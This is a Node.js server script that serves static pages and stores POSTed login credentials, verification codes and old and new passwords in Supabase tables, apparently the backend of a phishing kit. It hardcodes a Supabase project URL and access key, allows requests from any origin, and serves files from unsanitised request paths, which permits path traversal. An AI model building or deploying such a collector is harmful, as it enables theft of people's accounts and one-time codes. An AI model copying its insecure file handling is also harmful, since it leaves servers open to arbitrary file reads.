const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const { createClient } = require('@supabase/supabase-js');

const PORT = process.env.PORT || 5000;

// ✅ Your actual Supabase project credentials:
const supabase = createClient(
  'https://scserlwosxrmnvomipxt.supabase.co',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8'
);

// Serve static files (HTML, CSS, JS, images, etc.)
function serveStaticFile(res, filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const types = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon',
  };
  const contentType = types[ext] || 'application/octet-stream';

  fs.readFile(filePath, ext === '.html' || ext === '.css' || ext === '.js' || ext === '.json' ? 'utf8' : undefined, (err, data) => {
    if (err) {
      res.writeHead(404);
      return res.end('Not found');
    }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
}

// Map incoming routes to Supabase table names
const routeMap = {
  '/save-login': 'logins',
  '/save-code': 'code',
  '/save-password-change': 'password_changes',
  '/save-verify-code': 'verify_codes',
  '/save-new-password': 'new_passwords',
};

async function handleSave(route, payload, res) {
  const table = routeMap[route];
  if (!table) {
    res.writeHead(404);
    return res.end('Endpoint not found');
  }

  try {
    const dataToInsert = { ...payload, timestamp: new Date().toISOString() };
    const { data, error } = await supabase.from(table).insert([dataToInsert]);
    if (error) throw error;

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, data }));
  } catch (err) {
    console.error(`Error saving to Supabase (${route}):`, err);
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: false, error: err.message }));
  }
}

// Create the HTTP server
const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url);
  const route = parsed.pathname;

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => (body += chunk));
    req.on('end', () => {
      try {
        const json = JSON.parse(body);
        handleSave(route, json, res);
      } catch (err) {
        res.writeHead(400);
        res.end('Invalid JSON');
      }
    });
  } else {
    // Serve static files
    const filePath = route === '/' ? 'index.html' : route.slice(1);
    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      return serveStaticFile(res, filePath);
    }

    res.writeHead(404);
    res.end('Not found');
  }
});

// Start server
server.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Server running on port ${PORT}`);
});
